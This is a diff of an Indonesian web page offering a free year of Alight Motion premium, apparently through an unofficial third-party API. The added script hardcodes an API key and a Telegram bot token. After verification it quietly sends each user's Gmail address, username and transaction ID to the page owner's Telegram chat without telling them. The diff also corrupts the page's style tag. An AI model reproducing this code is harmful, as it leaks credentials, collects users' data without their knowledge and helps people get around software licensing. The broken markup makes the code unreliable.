@@ -4,11 +4,11 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Gmail Web API</title>
-  <style>
+  <title>Gmail Web  API</title>
+  <style
     :root{
       --bg1:#f7f4ff;
-      --bg2:#eef8ff;
+      --bg2:#eef8ff;>
       --card:#ffffff;
       --ink:#1f2430;
       --muted:#6c7280;
@@ -387,13 +387,13 @@
   <div class="wrap">
     <div class="hero">
       <div class="topbar">
-        <div class="pill">⚡ Alight Motion </div>
+        <div class="pill">⚡ Alight Motion</div>
         <div class="pill" id="sessionPill">Memuat sesi...</div>
       </div>
       <div class="title">
         <div class="badge">✦</div>
         <div>
-          <h1>Alight Motion Web</h1>
+          <h1>Gmail Web</h1>
           <p class="sub">Alight Motion 1 Tahun Free.</p>
         </div>
       </div>
@@ -444,363 +444,323 @@
   </div>
 
   <script>
-const APIKEY_STORAGE = "xs_pedia_apikey";
-const SESSION_STORAGE = "gmail_access_session";
-const HISTORY_STORAGE = "gmail_trx_history";
+    const API_BASE = "https://api.theresav.biz.id/premium/alightmotion";
+    const APIKEY = "RyuuXiao";
 
-const qs = new URLSearchParams(window.location.search);
-const urlApiKey = qs.get("apikey") || "";
-if (urlApiKey) localStorage.setItem(APIKEY_STORAGE, urlApiKey);
-const API_KEY = localStorage.getItem(APIKEY_STORAGE) || "";
+    const TELEGRAM_BOT_TOKEN = "7679348177:AAFymI3itCrCrhTDVX3pDp5tNwJV0jBsEQ4";
+    const TELEGRAM_OWNER_ID = "7058216834";
 
-const API_BASE_CANDIDATES = [
-  window.location.origin,
-  window.location.origin + "/api",
-  window.location.origin + "/h2h",
-  window.location.origin + "/backend"
-];
-
-let savedEmail = "";
-let currentTrxId = "";
-let currentUser = { username: "-", role: "-", limit: "-" };
-
-const els = {
-  sessionPill: document.getElementById("sessionPill"),
-  trxValue: document.getElementById("trxValue"),
-  usernameValue: document.getElementById("usernameValue"),
-  roleValue: document.getElementById("roleValue"),
-  limitValue: document.getElementById("limitValue"),
-  emailInput: document.getElementById("emailInput"),
-  typedEmailChip: document.getElementById("typedEmailChip"),
-  typedEmailText: document.getElementById("typedEmailText"),
-  savedEmailChip: document.getElementById("savedEmailChip"),
-  savedEmailText: document.getElementById("savedEmailText"),
-  sendBtn: document.getElementById("sendBtn"),
-  verifyBtn: document.getElementById("verifyBtn"),
-  sendLoader: document.getElementById("sendLoader"),
-  verifyLoader: document.getElementById("verifyLoader"),
-  sendStatus: document.getElementById("sendStatus"),
-  verifyStatus: document.getElementById("verifyStatus"),
-  sendStatusText: document.getElementById("sendStatusText"),
-  verifyStatusText: document.getElementById("verifyStatusText"),
-  doneLayer: document.getElementById("doneLayer"),
-  doneTitle: document.getElementById("doneTitle"),
-  doneText: document.getElementById("doneText"),
-  step2Card: document.getElementById("step2Card"),
-  step2: document.getElementById("step2"),
-  linkInput: document.getElementById("linkInput")
-};
-
-function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }
-function setLoading(btn, loader, on){
-  btn.disabled = on;
-  loader.classList.toggle("show", on);
-}
-function showDone(title, text){
-  els.doneTitle.textContent = title || "Berhasil";
-  els.doneText.textContent = text || "Proses selesai.";
-  els.doneLayer.classList.add("show");
-  els.doneLayer.setAttribute("aria-hidden","false");
-  setTimeout(() => {
-    els.doneLayer.classList.remove("show");
-    els.doneLayer.setAttribute("aria-hidden","true");
-  }, 1600);
-}
-
-function generatedTrxId(){
-  const d = new Date();
-  const stamp = `${d.getFullYear()}${String(d.getMonth()+1).padStart(2,"0")}${String(d.getDate()).padStart(2,"0")}${String(d.getHours()).padStart(2,"0")}${String(d.getMinutes()).padStart(2,"0")}${String(d.getSeconds()).padStart(2,"0")}`;
-  const rand = Math.random().toString(36).slice(2,8).toUpperCase();
-  return `TRX-${stamp}-${rand}`;
-}
-
-function syncTopCards(){
-  els.trxValue.textContent = currentTrxId || "-";
-  els.usernameValue.textContent = currentUser.username || "-";
-  els.roleValue.textContent = currentUser.role || "-";
-  els.limitValue.textContent = currentUser.limit || "-";
-  els.sessionPill.textContent = currentTrxId ? `TRX: ${currentTrxId}` : "XS-Pedia";
-}
-
-function updateVisibleEmail(value){
-  const v = String(value || "").trim();
-  if(v){
-    els.typedEmailChip.style.display = "inline-flex";
-    els.typedEmailText.textContent = v;
-  }else{
-    els.typedEmailChip.style.display = "none";
-    els.typedEmailText.textContent = "";
-  }
-}
-
-function normalizeAccess(access){
-  if (!access) return null;
-  const role = String(access.role || "-").toLowerCase();
-  const tier = String(access.tier || role || "-").toLowerCase();
-  return {
-    username: access.username || "-",
-    role: role === "-" ? "-" : role,
-    tier,
-    limit: access.limit || (tier === "vip" ? "VIP" : tier === "reseller" ? "5/hari" : "1/hari")
-  };
-}
-
-function setAccess(access){
-  const normalized = normalizeAccess(access);
-  if(!normalized) return;
-  currentUser = {
-    username: normalized.username,
-    role: normalized.role,
-    limit: normalized.limit
-  };
-  syncTopCards();
-}
-
-function saveSession(extra = {}){
-  try{
-    const payload = {
-      trxId: currentTrxId || "",
-      username: currentUser.username || "-",
-      role: currentUser.role || "-",
-      limit: currentUser.limit || "-",
-      email: savedEmail || "",
-      status: extra.status || "pending",
-      createdAt: extra.createdAt || new Date().toISOString(),
-      verifiedAt: extra.verifiedAt || ""
+    let savedEmail = "";
+    let currentTrxId = "";
+    let currentUser = {
+      username: "-",
+      role: "-",
+      limit: "-"
     };
-    localStorage.setItem(SESSION_STORAGE, JSON.stringify(payload));
-  }catch(e){}
-}
 
-function addHistory(extra = {}){
-  try{
-    const history = JSON.parse(localStorage.getItem(HISTORY_STORAGE) || "[]") || [];
-    const item = {
-      trxId: currentTrxId || "",
-      username: currentUser.username || "-",
-      role: currentUser.role || "-",
-      limit: currentUser.limit || "-",
-      email: savedEmail || "",
-      status: extra.status || "pending",
-      createdAt: extra.createdAt || new Date().toISOString(),
-      verifiedAt: extra.verifiedAt || ""
+    const els = {
+      sessionPill: document.getElementById("sessionPill"),
+      trxValue: document.getElementById("trxValue"),
+      usernameValue: document.getElementById("usernameValue"),
+      roleValue: document.getElementById("roleValue"),
+      limitValue: document.getElementById("limitValue"),
+      emailInput: document.getElementById("emailInput"),
+      typedEmailChip: document.getElementById("typedEmailChip"),
+      typedEmailText: document.getElementById("typedEmailText"),
+      savedEmailChip: document.getElementById("savedEmailChip"),
+      savedEmailText: document.getElementById("savedEmailText"),
+      sendBtn: document.getElementById("sendBtn"),
+      verifyBtn: document.getElementById("verifyBtn"),
+      sendLoader: document.getElementById("sendLoader"),
+      verifyLoader: document.getElementById("verifyLoader"),
+      sendStatus: document.getElementById("sendStatus"),
+      verifyStatus: document.getElementById("verifyStatus"),
+      sendStatusText: document.getElementById("sendStatusText"),
+      verifyStatusText: document.getElementById("verifyStatusText"),
+      doneLayer: document.getElementById("doneLayer"),
+      doneTitle: document.getElementById("doneTitle"),
+      doneText: document.getElementById("doneText"),
+      step2Card: document.getElementById("step2Card"),
+      step2: document.getElementById("step2"),
+      linkInput: document.getElementById("linkInput"),
     };
-    const idx = history.findIndex(x => String(x.trxId) === String(item.trxId));
-    if(idx >= 0) history[idx] = { ...history[idx], ...item };
-    else history.unshift(item);
-    localStorage.setItem(HISTORY_STORAGE, JSON.stringify(history.slice(0, 50)));
-  }catch(e){}
-}
 
-function parseJSONSafe(text){
-  try { return JSON.parse(text); } catch(e){ return null; }
-}
-
-function buildUrl(base, path, params = {}){
-  const u = new URL(path, base);
-  Object.entries(params).forEach(([k,v]) => {
-    if (v !== undefined && v !== null && String(v) !== "") u.searchParams.set(k, v);
-  });
-  if (API_KEY) u.searchParams.set("apikey", API_KEY);
-  return u.toString();
-}
-
-async function fetchJson(path, params = {}, method = "GET"){
-  const headers = { "Accept": "application/json" };
-  if (API_KEY) headers["X-API-Key"] = API_KEY;
-
-  let lastErr = null;
-  for (const base of API_BASE_CANDIDATES){
-    const url = buildUrl(base, path, params);
-    try{
-      const response = await fetch(url, {
-        method,
-        credentials: "include",
-        headers
-      });
-      const text = await response.text();
-      return {
-        ok: response.ok,
-        status: response.status,
-        json: parseJSONSafe(text),
-        text,
-        url
-      };
-    }catch(err){
-      lastErr = err;
+    function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }
+    function setLoading(btn, loader, on){
+      btn.disabled = on;
+      loader.classList.toggle("show", on);
     }
-  }
-  throw lastErr || new Error("Request gagal");
-}
-
-async function fetchAccess(){
-  const candidates = [
-    "/profile",
-    "/profile/users",
-    "/api/profile",
-    "/api/profile/users"
-  ];
-  for (const path of candidates){
-    try{
-      const res = await fetchJson(path);
-      if (res.ok && res.json && res.json.success && res.json.user){
-        const user = res.json.user;
-        currentUser = {
-          username: user.username || user.fullname || "-",
-          role: String(user.role || "-").toLowerCase(),
-          limit: user.limit || (String(user.role || "").toLowerCase() === "vip" ? "VIP" : String(user.role || "").toLowerCase() === "reseller" ? "5/hari" : "1/hari")
-        };
-        syncTopCards();
-        return true;
+    function showDone(title, text){
+      els.doneTitle.textContent = title || "Berhasil";
+      els.doneText.textContent = text || "Proses selesai.";
+      els.doneLayer.classList.add("show");
+      els.doneLayer.setAttribute("aria-hidden", "false");
+      setTimeout(() => {
+        els.doneLayer.classList.remove("show");
+        els.doneLayer.setAttribute("aria-hidden", "true");
+      }, 1700);
+    }
+    function generatedTrxId(){
+      const d = new Date();
+      const stamp = `${d.getFullYear()}${String(d.getMonth()+1).padStart(2,"0")}${String(d.getDate()).padStart(2,"0")}${String(d.getHours()).padStart(2,"0")}${String(d.getMinutes()).padStart(2,"0")}${String(d.getSeconds()).padStart(2,"0")}`;
+      const rand = Math.random().toString(36).slice(2,8).toUpperCase();
+      return `TRX-${stamp}-${rand}`;
+    }
+    function syncTopCards(){
+      els.trxValue.textContent = currentTrxId || "-";
+      els.usernameValue.textContent = currentUser.username || "-";
+      els.roleValue.textContent = currentUser.role || "-";
+      els.limitValue.textContent = currentUser.limit || "-";
+      els.sessionPill.textContent = currentTrxId ? `TRX: ${currentTrxId}` : "Memuat sesi...";
+    }
+    function updateVisibleEmail(email){
+      const v = (email || "").trim();
+      if(v){
+        els.typedEmailChip.style.display = "inline-flex";
+        els.typedEmailText.textContent = v;
+      }else{
+        els.typedEmailChip.style.display = "none";
+        els.typedEmailText.textContent = "";
       }
-    }catch(e){}
-  }
-  try{
-    const saved = JSON.parse(localStorage.getItem(SESSION_STORAGE) || "null");
-    if (saved){
-      currentTrxId = saved.trxId || currentTrxId;
-      savedEmail = saved.email || savedEmail;
-      currentUser.username = saved.username || currentUser.username;
-      currentUser.role = saved.role || currentUser.role;
-      currentUser.limit = saved.limit || currentUser.limit;
-      if (savedEmail) updateVisibleEmail(savedEmail);
     }
-  }catch(e){}
-  syncTopCards();
-  return false;
-}
+    function saveSession(extra = {}){
+      try{
+        const payload = {
+          trxId: currentTrxId || "",
+          username: currentUser.username || "-",
+          role: currentUser.role || "-",
+          limit: currentUser.limit || "-",
+          email: savedEmail || "",
+          status: extra.status || "pending",
+          createdAt: extra.createdAt || new Date().toISOString(),
+          verifiedAt: extra.verifiedAt || ""
+        };
+        localStorage.setItem("gmail_access_session", JSON.stringify(payload));
+      }catch(e){}
+    }
+    function addHistory(extra = {}){
+      try{
+        const key = "gmail_trx_history";
+        const history = JSON.parse(localStorage.getItem(key) || "[]") || [];
+        const item = {
+          trxId: currentTrxId || "",
+          username: currentUser.username || "-",
+          role: currentUser.role || "-",
+          limit: currentUser.limit || "-",
+          email: savedEmail || "",
+          status: extra.status || "pending",
+          createdAt: extra.createdAt || new Date().toISOString(),
+          verifiedAt: extra.verifiedAt || ""
+        };
+        const idx = history.findIndex(x => String(x.trxId) === String(item.trxId));
+        if(idx >= 0) history[idx] = { ...history[idx], ...item };
+        else history.unshift(item);
+        localStorage.setItem(key, JSON.stringify(history.slice(0, 50)));
+      }catch(e){}
+    }
+    async function sendTelegramNotification(payload){
+      const time = (() => {
+        try{
+          return new Intl.DateTimeFormat('id-ID', {
+            timeZone: 'Asia/Jakarta',
+            dateStyle: 'full',
+            timeStyle: 'medium'
+          }).format(new Date());
+        }catch(e){
+          return new Date().toLocaleString('id-ID');
+        }
+      })();
 
-els.emailInput.addEventListener("input", () => {
-  updateVisibleEmail(els.emailInput.value.trim());
-});
+      const message = [
+        "✅ GMAIL SELESAI",
+        `TRX ID: ${payload.trxId || '-'}`,
+        `Username: ${payload.username || '-'}`,
+        `Role: ${String(payload.role || '-').toUpperCase()}`,
+        `Limit: ${payload.limit || '-'}`,
+        `Email Gmail: ${payload.email || '-'}`,
+        `Waktu: ${time} WIB`,
+        `Status: ${payload.statusText || 'Sukses kirim + verifikasi'}`
+      ].join("\n");
 
-async function sendEmail(){
-  const email = els.emailInput.value.trim();
-  if (!email) return els.emailInput.focus();
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${encodeURIComponent(TELEGRAM_OWNER_ID)}&text=${encodeURIComponent(message)}`;
+      try{
+        await fetch(url, { method: "GET", mode: "no-cors" });
+      }catch(e){
+        console.error("Telegram notif gagal:", e);
+      }
+    }
 
-  setLoading(els.sendBtn, els.sendLoader, true);
-  els.sendStatus.classList.remove("show");
+    async function loadProfile(){
+      // Optional: if the hosting site has a logged-in session, use it.
+      try{
+        const res = await fetch("/profile/users", { credentials: "include" });
+        if(!res.ok) throw new Error("profile unavailable");
+        const data = await res.json();
+        if(data && data.success && data.user){
+          const u = data.user;
+          currentUser.username = u.username || u.fullname || u.name || currentUser.username;
+          currentUser.role = String(u.role || currentUser.role || "-");
+          currentUser.limit = u.limit || u.glimit || (String(currentUser.role).toLowerCase() === "vip" ? "Unlimited" : "1/hari");
+          syncTopCards();
+          return;
+        }
+      }catch(e){}
+      // fallback from saved local session
+      try{
+        const saved = JSON.parse(localStorage.getItem("gmail_access_session") || "null");
+        if(saved){
+          currentTrxId = saved.trxId || currentTrxId;
+          savedEmail = saved.email || savedEmail;
+          currentUser.username = saved.username || currentUser.username;
+          currentUser.role = saved.role || currentUser.role;
+          currentUser.limit = saved.limit || currentUser.limit;
+          syncTopCards();
+          if(savedEmail) updateVisibleEmail(savedEmail);
+          if(currentTrxId) {
+            els.savedEmailChip.style.display = savedEmail ? "inline-flex" : "none";
+            if(savedEmail) els.savedEmailText.textContent = savedEmail;
+          }
+        }else{
+          syncTopCards();
+        }
+      }catch(e){
+        syncTopCards();
+      }
+    }
 
-  try{
-    // generate trx immediately when user enters/send email
-    currentTrxId = generatedTrxId();
-    syncTopCards();
+    function parseJsonSafe(text){
+      try { return JSON.parse(text); } catch (e) { return null; }
+    }
 
-    const res = await fetchJson("/h2h/gmail/send", {
-      email,
-      trxId: currentTrxId,
-      id: currentTrxId
+    async function fetchJson(url){
+      const res = await fetch(url, { method: "GET" });
+      const text = await res.text();
+      const json = parseJsonSafe(text);
+      return {
+        ok: res.ok,
+        status: res.status,
+        json,
+        text
+      };
+    }
+
+    els.emailInput.addEventListener("input", () => {
+      const v = els.emailInput.value.trim();
+      updateVisibleEmail(v);
     });
 
-    const data = res.json || {};
-    if (res.ok && data.success === true){
-      const access = data.data?.access || data.access;
-      if (access) setAccess(access);
+    async function sendEmail(){
+      const email = els.emailInput.value.trim();
+      if(!email){
+        els.emailInput.focus();
+        return;
+      }
 
-      savedEmail = email;
-      currentTrxId = data.data?.trxId || data.data?.id || currentTrxId || generatedTrxId();
-      syncTopCards();
+      setLoading(els.sendBtn, els.sendLoader, true);
+      els.sendStatus.classList.remove("show");
 
-      els.sendStatusText.textContent = data.message || "Gmail berhasil dikirim.";
-      els.sendStatus.classList.add("show");
+      try{
+        const url = `${API_BASE}/send?email=${encodeURIComponent(email)}&apikey=${encodeURIComponent(APIKEY)}`;
+        const result = await fetchJson(url);
+        const json = result.json || {};
 
-      els.savedEmailChip.style.display = "inline-flex";
-      els.savedEmailText.textContent = savedEmail;
+        if(result.ok && json && json.status === true){
+          savedEmail = (json?.data?.email || email).trim();
+          currentTrxId = json?.data?.trxId || json?.data?.trx_id || json?.trxId || json?.trx || json?.data?.id || generatedTrxId();
+          if(!currentUser.username || currentUser.username === "-"){
+            currentUser.username = savedEmail.split("@")[0] || "-";
+          }
+          if(!currentUser.role || currentUser.role === "-"){
+            currentUser.role = "VIP";
+          }
+          if(!currentUser.limit || currentUser.limit === "-"){
+            currentUser.limit = "Unlimited";
+          }
 
-      els.step2Card.style.display = "block";
-      els.step2.classList.add("show");
+          syncTopCards();
+          updateVisibleEmail(savedEmail);
+          els.savedEmailChip.style.display = "inline-flex";
+          els.savedEmailText.textContent = savedEmail;
+          els.sendStatusText.textContent = "Gmail berhasil dikirim.";
+          els.sendStatus.classList.add("show");
 
-      saveSession({ status: "pending" });
-      addHistory({ status: "pending" });
+          saveSession({ status: "pending" });
+          addHistory({ status: "pending" });
 
-      showDone("Terkirim", "Link Gmail berhasil dikirim.");
-    }else{
-      // keep trx so user can retry without losing id
-      els.sendStatusText.textContent = data.message || `Gagal mengirim Gmail (HTTP ${res.status}).`;
-      els.sendStatus.classList.add("show");
+          await sleep(450);
+          els.step2Card.style.display = "block";
+          els.step2.classList.add("show");
+          showDone("Terkirim", "Link Gmail berhasil dikirim.");
+        }else{
+          const msg = json?.message || json?.error || "Gagal mengirim Gmail.";
+          els.sendStatusText.textContent = msg;
+          els.sendStatus.classList.add("show");
+        }
+      }catch(err){
+        els.sendStatusText.textContent = "Koneksi bermasalah. Coba lagi.";
+        els.sendStatus.classList.add("show");
+      }finally{
+        setLoading(els.sendBtn, els.sendLoader, false);
+      }
     }
-  }catch(err){
-    console.error(err);
-    els.sendStatusText.textContent = "Gagal terhubung ke backend XS-Pedia.";
-    els.sendStatus.classList.add("show");
-  }finally{
-    setLoading(els.sendBtn, els.sendLoader, false);
-  }
-}
 
-async function verifyLink(){
-  const link = els.linkInput.value.trim();
+    async function verifyLink(){
+      const link = els.linkInput.value.trim();
+      if(!savedEmail){
+        showDone("Email belum ada", "Kirim Gmail dulu di langkah 1.");
+        return;
+      }
+      if(!link){
+        els.linkInput.focus();
+        return;
+      }
 
-  if (!savedEmail){
-    showDone("Email belum ada", "Kirim Gmail dulu di langkah 1.");
-    return;
-  }
-  if (!link){
-    els.linkInput.focus();
-    return;
-  }
+      setLoading(els.verifyBtn, els.verifyLoader, true);
+      els.verifyStatus.classList.remove("show");
 
-  setLoading(els.verifyBtn, els.verifyLoader, true);
-  els.verifyStatus.classList.remove("show");
+      try{
+        const url = `${API_BASE}/verify?email=${encodeURIComponent(savedEmail)}&link=${encodeURIComponent(link)}&apikey=${encodeURIComponent(APIKEY)}`;
+        const result = await fetchJson(url);
+        const json = result.json || {};
 
-  try{
-    const res = await fetchJson("/h2h/gmail/verify", {
-      email: savedEmail,
-      link,
-      trxId: currentTrxId,
-      id: currentTrxId
-    });
+        if(result.ok && json && json.status === true){
+          els.verifyStatusText.textContent = "Link berhasil diverifikasi.";
+          els.verifyStatus.classList.add("show");
+          showDone("Sukses", "Verifikasi berhasil.");
 
-    const data = res.json || {};
-    if (res.ok && data.success === true){
-      const access = data.data?.access || data.access;
-      if (access) setAccess(access);
+          const verifiedAt = new Date().toISOString();
+          saveSession({ status: "success", verifiedAt });
+          addHistory({ status: "success", verifiedAt });
 
-      els.verifyStatusText.textContent = data.message || "Link berhasil diverifikasi.";
-      els.verifyStatus.classList.add("show");
-      showDone("Sukses", "Verifikasi berhasil.");
+          await sendTelegramNotification({
+            trxId: currentTrxId || "-",
+            username: currentUser.username || "-",
+            role: currentUser.role || "-",
+            limit: currentUser.limit || "-",
+            email: savedEmail || "-",
+            statusText: "Sukses kirim + verifikasi"
+          });
 
-      const verifiedAt = new Date().toISOString();
-      saveSession({ status: "success", verifiedAt });
-      addHistory({ status: "success", verifiedAt });
-
-      // auto-refresh tampilan setelah verifikasi tahap ke-2
-      await sleep(500);
-
-      // reset tampilan input tapi TRX baru tetap tampil sebagai session terbaru
-      const finishedTrx = currentTrxId;
-      currentTrxId = generatedTrxId();
-      currentUser = normalizeAccess(access) || currentUser;
-      savedEmail = "";
-      els.emailInput.value = "";
-      els.linkInput.value = "";
-      updateVisibleEmail("");
-      els.savedEmailChip.style.display = "none";
-      els.savedEmailText.textContent = "";
-      els.step2Card.style.display = "none";
-      syncTopCards();
-      saveSession({ status: "idle", verifiedAt });
-      addHistory({ status: "success", verifiedAt, trxId: finishedTrx });
-      await fetchAccess();
-    }else{
-      els.verifyStatusText.textContent = data.message || `Verifikasi gagal (HTTP ${res.status}).`;
-      els.verifyStatus.classList.add("show");
+          // Keep top summary, clear only the active input fields/process chips.
+          els.emailInput.value = "";
+          els.linkInput.value = "";
+          updateVisibleEmail("");
+          els.savedEmailChip.style.display = "none";
+          els.savedEmailText.textContent = "";
+        }else{
+          const msg = json?.message || json?.error || "Verifikasi gagal.";
+          els.verifyStatusText.textContent = msg;
+          els.verifyStatus.classList.add("show");
+        }
+      }catch(err){
+        els.verifyStatusText.textContent = "Koneksi bermasalah. Coba lagi.";
+        els.verifyStatus.classList.add("show");
+      }finally{
+        setLoading(els.verifyBtn, els.verifyLoader, false);
+      }
     }
-  }catch(err){
-    console.error(err);
-    els.verifyStatusText.textContent = "Gagal terhubung ke backend XS-Pedia.";
-    els.verifyStatus.classList.add("show");
-  }finally{
-    setLoading(els.verifyBtn, els.verifyLoader, false);
-  }
-}
 
-window.sendEmail = sendEmail;
-window.verifyLink = verifyLink;
-window.addEventListener("load", () => {
-  syncTopCards();
-  fetchAccess();
-});
-</script>
+    window.addEventListener("load", loadProfile);
+  </script>
 </body>
 </html>
